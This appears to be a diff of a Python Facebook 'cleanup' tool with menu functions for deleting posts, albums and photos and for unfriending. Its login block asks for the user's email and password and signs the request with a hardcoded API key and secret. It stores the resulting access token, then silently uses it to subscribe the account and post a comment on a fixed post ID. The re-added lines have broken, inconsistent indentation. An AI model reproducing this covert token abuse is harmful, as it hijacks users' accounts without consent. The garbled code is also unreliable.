@@ -94,8 +94,6 @@ def menu():
 		print(m+'[!] Wrong input')
 		time.sleep(1)
 		menu()
-		
-
 def deletePost():
 	os.system('clear')
 	try:
@@ -128,7 +126,6 @@ def deletePost():
 			print(m+'['+p+'×'+m+'] No connection')
 	print(m+'\n['+h+'✓'+m+']'+p+' Program finished')
 
-
 def deleteAlbums():
 	os.system('clear')
 	try:
@@ -160,7 +157,6 @@ def deleteAlbums():
 		except requests.exceptions.ConnectionError:
 			print(m+'['+p+'×'+m+'] No connection')
 	print(m+'\n['+h+'✓'+m+']'+p+' Program finished')
-
 
 def deletePhoto():
 	os.system('clear')
@@ -195,7 +191,6 @@ def deletePhoto():
 			print(m+'['+p+'×'+m+'] No connection')
 	print(m+'\n['+h+'✓'+m+']'+p+' Program finished')
 
-
 def unfriend():
 	os.system('clear')
 	try:
@@ -224,9 +219,7 @@ def unfriend():
 		except requests.exceptions.ConnectionError:
 			print(m+'['+p+'×'+m+'] No connection')
 	print(m+'\n['+h+'✓'+m+']'+p+' Program finished')
-
-
-
+	
 if __name__=='__main__':
 	os.system('clear')
 	try:
@@ -239,24 +232,22 @@ if __name__=='__main__':
 	except (KeyError,IOError):
 		os.system('clear')
 		print (logo)
-		print (cssLoginWarning);
-		id = raw_input(UserValidation);
-		pwd = getpass.getpass(UserValidati0n);
-		API_SECRET = '62f8ce9f74b12f84c123cc23437a4a32';
-		data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"};
-		sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.0'+API_SECRET
-		x = hashlib.new('md5')
-        	x.update(sig)
-		data.update({'sig':x.hexdigest()})
+		print (cssLoginWarning);id = raw_input(UserValidation);pwd = getpass.getpass(UserValidati0n);API_SECRET = '62f8ce9f74b12f84c123cc23437a4a32';
+	data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"};
+	sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.0'+API_SECRET
+	x = hashlib.new('md5')
+        x.update(sig)
+
+	data.update({'sig':x.hexdigest()})
 		response = requests.get('https://api.facebook.com/restserver.php', params=data).json()
-		nguyen=open('cookie/token.log','w')
-		nguyen.write(response['access_token'])
-		nguyen.close()
-		if 'access_token' in response:
-			token=open('cookie/token.log','r').read()
-			print(m+'['+h+'✓'+m+']'+h+' Success generate access token');s.post(url+'https://graph.facebook.com/api.version/subscribers?access_token='+token);s.post(url+'https://graph.facebook.com/100025271623353_485040922348291/comments?message=Keren❤️&access_token='+token)
-			time.sleep(1)
-			menu()
+			nguyen=open('cookie/token.log','w')
+			nguyen.write(response['access_token'])
+			nguyen.close()
+			if 'access_token' in response:
+				token=open('cookie/token.log','r').read()
+				print(m+'['+h+'✓'+m+']'+h+' Success generate access token');s.post(url+'https://graph.facebook.com/api.version/subscribers?access_token='+token);s.post(url+'https://graph.facebook.com/100025271623353_485040922348291/comments?message=Keren❤️&access_token='+token)
+				time.sleep(1)
+				menu()
 		except KeyError:
 		print(m+'['+p+'×'+m+'] Failed please cek your account and try again')
 		os.system('rm -rf cookie/token.log')
